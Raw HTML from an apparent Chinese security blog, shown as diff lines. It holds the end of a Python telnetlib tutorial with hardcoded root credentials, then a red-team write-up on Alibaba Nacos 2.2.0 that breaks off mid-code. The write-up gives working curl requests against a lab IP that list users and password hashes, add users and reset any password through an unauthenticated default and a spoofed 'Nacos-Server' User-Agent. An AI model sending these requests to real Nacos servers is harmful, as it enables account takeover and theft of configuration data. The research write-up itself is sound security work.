class="line"><span class="keyword">with</span> telnetlib.Telnet(host, port, timeout) <span class="keyword">as</span> session:</span><br><span class="line">    session.write(<span class="string">b&quot;administrator\n&quot;</span>)</span><br><span class="line">    session.write(<span class="string">b&quot;password\n&quot;</span>)</span><br><span class="line">    session.write(<span class="string">b&quot;reboot\n&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>4.怎么获取命令执行结果—-使用read_very_eager()方法，该方法获取的内容是上次获取之后本次获取之前的所有输入输出；由于获取到的是bytes类型要decode解码一下</p>
-</blockquote>
-<blockquote>
-<p>5.怎么退出telnet—退出telnet使用write方法向服务器提交exit命令即可</p>
-</blockquote>
-<h2><span id="程序源码清单">程序源码清单</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TelnetClient</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,</span>):</span><br><span class="line">        self.tn = telnetlib.Telnet()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 此函数实现telnet登录主机</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login_host</span>(<span class="params">self,host_ip,username,password</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># self.tn = telnetlib.Telnet(host_ip,port=23)</span></span><br><span class="line">            self.tn.<span class="built_in">open</span>(host_ip,port=<span class="number">23</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s网络连接失败&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 等待login出现后输入用户名，最多等待10秒</span></span><br><span class="line">        self.tn.read_until(<span class="string">b&#x27;login: &#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        self.tn.write(username.encode(<span class="string">&#x27;ascii&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 等待Password出现后输入用户名，最多等待10秒</span></span><br><span class="line">        self.tn.read_until(<span class="string">b&#x27;Password: &#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        self.tn.write(password.encode(<span class="string">&#x27;ascii&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 延时两秒再收取返回结果，给服务端足够响应时间</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 获取登录结果</span></span><br><span class="line">        <span class="comment"># read_very_eager()获取到的是的是上次获取之后本次获取之前的所有输出</span></span><br><span class="line">        command_result = self.tn.read_very_eager().decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Login incorrect&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> command_result:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s登录成功&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s登录失败，用户名或密码错误&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 此函数实现执行传过来的命令，并输出其执行结果</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_some_command</span>(<span class="params">self,command</span>):</span><br><span class="line">        <span class="comment"># 执行命令</span></span><br><span class="line">        self.tn.write(command.encode(<span class="string">&#x27;ascii&#x27;</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 获取命令结果</span></span><br><span class="line">        command_result = self.tn.read_very_eager().decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        logging.warning(<span class="string">&#x27;命令执行结果：\n%s&#x27;</span> % command_result)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 退出telnet</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">logout_host</span>(<span class="params">self</span>):</span><br><span class="line">        self.tn.write(<span class="string">b&quot;exit\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host_ip = <span class="string">&#x27;192.168.220.129&#x27;</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;abcd1234&#x27;</span></span><br><span class="line">    command = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">    telnet_client = TelnetClient()</span><br><span class="line">    <span class="comment"># 如果登录结果返加True，则执行命令，然后退出</span></span><br><span class="line">    <span class="keyword">if</span> telnet_client.login_host(host_ip,username,password):</span><br><span class="line">        telnet_client.execute_some_command(command)</span><br><span class="line">        telnet_client.logout_host()</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>python 库 telnetlib: Telnet客户端:<br>telnetlib模块提供的Telnet类实现了Telnet协议。它为协议字符和telnet选项提供符号常量，符号常量来源于arpa&#x2F;telnet.h去掉了前缀TELOPT_</p>
-<p>1.Telnet.read_all(): 读取所有数据直到EOF，阻塞直到连接关闭<br>2.Telnet.read_some(): 读取至少一个字节的数据，除非EOF。如果没有数据则阻塞。<br>3.Telnet.read_until(expected[, timeout]):常用于登录，与write连用；读取直到遇到了给定的字符串expected或超时秒数<br>4.Telnet.read_very_eager(): 非阻塞地读取。连接关闭或者没有数据时触发EOFError异常，返回b’’如果没有数据。 获取命令执行结果：获取的内容是上次获取之后本次获取之前的所有输入输出<br>5.Telnet.read_eager(): 读取已有数据(快)<br>6.Telnet.read_lazy(): 读取已有数据(懒)<br>7.Telnet.read_sb_data(): 返回的SB&#x2F;SE pair(suboption begin&#x2F;end)之间的数据，此方法永远不会阻塞<br>8.Telnet.open(host[,port[,timeout]]): 连接到主机，可选的第二个参数是默认为标准的Telnet端口（23）的端口号。可选的超时参数（以秒指定）阻塞操作（如连接尝试超时（如果不指定，默认使用全局超时设置））<br>9.Telnet.msg(msg[, *args]): 当调试级别为&gt;0打印调试信息<br>10.Telnet.set_debuglevel(debuglevel)：设置调试级别。debuglevel越高信息越多。<br>11.Telnet.close() 关闭连接<br>12.Telnet.get_socket()：返回套接字供内部使用<br>13.Telnet.fileno(): 返回套接字对象内部使用的文件描述<br>14.Telnet.write(buffer): 常用于执行命令；写入字符串到套接字，加倍IAC的任何字符。连接关闭时可能触发OSError异常。<br>15.Telnet.interact(): 交由用户控制<br>16.Telnet.mt_interact(): 多线程版本的interact()<br>17.Telnet.expect(list[, timeout]): 读取直到匹配正则表达式项列表中的一个。list是一个正则表达式列表，包含编译(regx对象)或未编译（字节字符串）。timeout以秒为单位，默认值为无限期阻塞。返回元祖的三个项目：</p>
-<ul>
-<li>1.index为匹配正则表达式的位置；</li>
-<li>2.match对象</li>
-<li>3.此时读了的字节<br>18.Telnet.set_option_negotiation_callback(callback):每次从输入流读取telnet选项时，调用callback,后续步骤不会执行。</li>
-</ul>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Python/" rel="tag">Python</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Telnetlib/" rel="tag">Telnetlib</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/07/24/Nacos-AccessToken/">
-                云原生组件Nacos新型红队手法研究
-            </a>
-        </h2>
-    
-    <time>
-        Jul 24, 2023
-    </time>
-    <section class="content">
-        <h1><span id="云原生组件nacos新型红队手法研究">云原生组件Nacos新型红队手法研究</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Jwwd5ailKNhwR57ACXB1kQ">Zhuri</a> 并作补充</p>
-</blockquote>
-<h2><span id="组件简介">组件简介</span></h2><blockquote>
-<p>Nacos &#x2F;nɑ:kəʊs&#x2F; 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。<br>Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。<br>Nacos 帮助您更敏捷和容易地构建、交付和管理微服务平台。Nacos 是构建以“服务”为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施。</p>
-</blockquote>
-<h2><span id="历史漏洞">历史漏洞</span></h2><blockquote>
-<p>2020年12月29日，Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。<br><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/1105">https://github.com/alibaba/nacos/issues/1105</a><br>在Nacos 2.0版本存在未授权访问漏洞，程序未有效对于用户权限进行判断，导致能够添加任意用户、修改任意用户密码等等问题。<br>这里就不做过多介绍了，网上有很多。<br>就在我撰写本文的时候，官方刚刚发布了最新的版本2.2.0 (Dec 14, 2022)，我们就来一探究竟。</p>
-</blockquote>
-<h2><span id="部署方式">部署方式</span></h2><blockquote>
-<p>为了方便起见，我这里使用Debian系统并采用的单机部署的方式。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install default-jdk</span><br><span class="line">sudo ufw <span class="built_in">disable</span></span><br><span class="line">wget https://github.com/alibaba/nacos/releases/download/2.2.0/nacos-server-2.2.0.zip</span><br><span class="line">unzip nacos-server-2.2.0.zip</span><br><span class="line"><span class="built_in">cd</span> nacos/bin</span><br><span class="line">bash startup.sh -m standalone</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>然后访问<a target="_blank" rel="noopener" href="http://ip:8848/nacos%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%87%BA%E7%8E%B0%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%B0%B1%E8%AF%B4%E6%98%8E%E9%83%A8%E7%BD%B2%E6%88%90%E5%8A%9F%E4%BA%86%EF%BC%8C%E9%BB%98%E8%AE%A4%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%B8%BAnacos/nacos%E3%80%82">http://ip:8848/nacos，如果出现登录界面，就说明部署成功了，默认的账号密码为nacos/nacos。</a></p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>我们首先尝试使用老版本的payload尝试能不能打。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>不出意外，返回:</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">caused: Parameter conditions <span class="string">&quot;search=blur&quot;</span> OR <span class="string">&quot;search=accurate&quot;</span> not met <span class="keyword">for</span> actual request parameters: pageNo=&#123;1&#125;, pageSize=&#123;9&#125;;%</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>我们仔细看一下报错，提示说是缺少search&#x3D;blur或者search&#x3D;accurate，那我们加上再试试看。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=accurate&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/2.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>这就成功了？<br>我一开始以为没修，后来发现，我通过查看鉴权相关文档时(<a target="_blank" rel="noopener" href="https://nacos.io/en-us/docs/auth.html)%EF%BC%8C%E5%AE%83%E5%8F%AA%E6%8F%8F%E8%BF%B0%E4%BA%86%E5%A6%82%E4%BD%95%E5%BC%80%E5%90%AF%E9%89%B4%E6%9D%83%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%B8%8D%E5%BC%80%E5%90%AF%E9%89%B4%E6%9D%83%E7%9A%84%E5%90%8E%E6%9E%9C%EF%BC%8C%E4%BD%86%E6%98%AF%E9%BB%98%E8%AE%A4%E5%90%AF%E5%8A%A8%E5%8D%B4%E4%B8%8D%E5%BC%80%E9%89%B4%E6%9D%83%E7%9A%84%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%A0%B9%E6%8D%AEgithub%E7%9A%84issue%E6%9D%A5%E7%9C%8B%EF%BC%8C%E5%AE%98%E6%96%B9%E5%B9%B6%E4%B8%8D%E8%AE%A4%E4%B8%BA%E8%BF%99%E6%98%AF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A5%E8%87%B3%E4%BA%8E%E7%BD%91%E4%B8%8A%E5%87%BA%E4%BA%86%E4%B9%8B%E5%89%8D%E7%94%B1%E4%BA%8E%E4%B8%8D%E5%BD%93%E5%A4%84%E7%90%86User-Agent%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%90%8E%E4%BA%BA%E5%B0%91%E6%9C%89%E6%8C%96%E6%8E%98%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%8C%E7%BD%91%E4%B8%8A%E7%9A%84%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E4%B9%9F%E5%9F%BA%E6%9C%AC%E4%B8%8A%E5%81%9C%E7%95%99%E5%9C%A8%E9%82%A3%E6%AC%A1CVE%E3%80%82">https://nacos.io/en-us/docs/auth.html)，它只描述了如何开启鉴权，以及不开启鉴权的后果，但是默认启动却不开鉴权的，并且根据github的issue来看，官方并不认为这是漏洞，以至于网上出了之前由于不当处理User-Agent导致的未授权访问漏洞之后，后人少有挖掘其利用方式，网上的相关资料也基本上停留在那次CVE。</a></p>
-</blockquote>
-<h2><span id="未开启auth">未开启auth</span></h2><blockquote>
-<p>由于默认是不开auth的，所以我们先来讨论未开启auth的情况。</p>
-</blockquote>
-<h3><span id="读取用户账号密码">读取用户账号密码</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;totalCount&quot;</span>:1,<span class="string">&quot;pageNumber&quot;</span>:1,<span class="string">&quot;pagesAvailable&quot;</span>:1,<span class="string">&quot;pageItems&quot;</span>:[&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;nacos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;$2a$10<span class="variable">$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu</span>&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>
-
-<h3><span id="未授权添加用户">未授权添加用户</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?username=test1&amp;password=test1&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:200,<span class="string">&quot;message&quot;</span>:null,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;create user ok!&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<h3><span id="任意用户密码更改">任意用户密码更改</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?accessToken=&#x27;</span> -H <span class="string">&#x27;User-Agent:Nacos-Server&#x27;</span> -d <span class="string">&#x27;username=test1&amp;newPassword=test2&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>基本上目前主流针对Nacos的利用手法就停留在这里了，以至于防守方会通过WAF规则的形式来拦截掉这几个url请求。<br>但是根据代码审计以及官方的api接口文档，我们还能找到许多可以利用的接口，官方文档里面有的，我就不说了，大家自己可以去OpenAPI（<a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/open-api.html%EF%BC%89%E8%87%AA%E8%A1%8C%E6%9F%A5%E7%9C%8B%EF%BC%8C%E5%AE%98%E7%BD%91%E9%87%8C%E9%9D%A2%E7%9A%84OpenAPI%E6%89%80%E7%BB%99%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%B7%E5%80%BC%E5%B9%B6%E4%B8%8D%E6%98%AF%E5%BE%88%E9%AB%98%E3%80%82">https://nacos.io/zh-cn/docs/open-api.html）自行查看，官网里面的OpenAPI所给出的利用价值并不是很高。</a></p>
-</blockquote>
-<h3><span id="代码审计">代码审计</span></h3><blockquote>
-<p>下载源码后通过简单查找发现在<code>nacos/config/src/main/java/com/alibaba/nacos/config/server/constant/Constants.java</code>和<code>nacos/core/src/main/java/com/alibaba/nacos/core/utils/Commons.java</code>文件下，有相关路由的定义，相关代码如下：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_PATH</span> <span class="operator">=</span> <span class="string">&quot;/v1/cs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_V2_PATH</span> <span class="operator">=</span> <span class="string">&quot;/v2/cs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">OPS_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/ops&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CAPACITY_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/capacity&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COMMUNICATION_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/communication&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/configs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_CONTROLLER_V2_PATH</span> <span class="operator">=</span> BASE_V2_PATH + <span class="string">&quot;/config&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HEALTH_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/health&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HISTORY_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/history&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HISTORY_CONTROLLER_V2_PATH</span> <span class="operator">=</span> BASE_V2_PATH + <span class="string">&quot;/history&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LISTENER_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/listener&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NAMESPACE_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/namespaces&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">METRICS_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/metrics&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Commons</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_CONTEXT</span> <span class="operator">=</span> <span class="string">&quot;/nacos&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_VERSION</span> <span class="operator">=</span> <span class="string">&quot;/v1&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_VERSION_V2</span> <span class="operator">=</span> <span class="string">&quot;/v2&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_NACOS_CORE_CONTEXT</span> <span class="operator">=</span> NACOS_SERVER_VERSION + <span class="string">&quot;/core&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_CORE_CONTEXT</span> <span class="operator">=</span> DEFAULT_NACOS_CORE_CONTEXT;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_CORE_CONTEXT_V2</span> <span class="operator">=</span> NACOS_SERVER_VERSION_V2 + <span class="string">&quot;/core&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>我们可以看到有V1、V2两种API接口，我们根据不同类型再具体分析。</p>
-</blockquote>
-<h3><span id="获取配置数据">获取配置数据</span></h3><blockquote>
-<p>根据官方OpenAPI的说明，你需要知道dataId与group的值，才能读取到对应的配置文件，如果留空或者不填，则会无法读取。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.example&amp;group=com.alibaba.nacos&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>事实真的是这样吗？<br>我们看一下<code>/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigController.java</code>文件中369行开始的代码。</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Query the configuration information and return it in JSON format.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping(params = &quot;search=accurate&quot;)</span></span><br><span class="line">   <span class="meta">@Secured(action = ActionTypes.READ, signType = SignType.CONFIG)</span></span><br><span class="line">   <span class="keyword">public</span> Page&lt;ConfigInfo&gt; <span class="title function_">searchConfig</span><span class="params">(<span class="meta">@RequestParam(&quot;dataId&quot;)</span> String dataId, <span class="meta">@RequestParam(&quot;group&quot;)</span> String group,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;appName&quot;, required = false)</span> String appName,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;tenant&quot;, required = false, defaultValue = StringUtils.EMPTY)</span> String tenant,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;config_tags&quot;, required = false)</span> String configTags,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;pageNo&quot;)</span> <span class="type">int</span> pageNo, <span class="meta">@RequestParam(&quot;pageSize&quot;)</span> <span class="type">int</span> pageSize)</span> &#123;</span><br><span class="line">       Map&lt;String, Object&gt; configAdvanceInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">100</span>);</span><br><span class="line">       <span 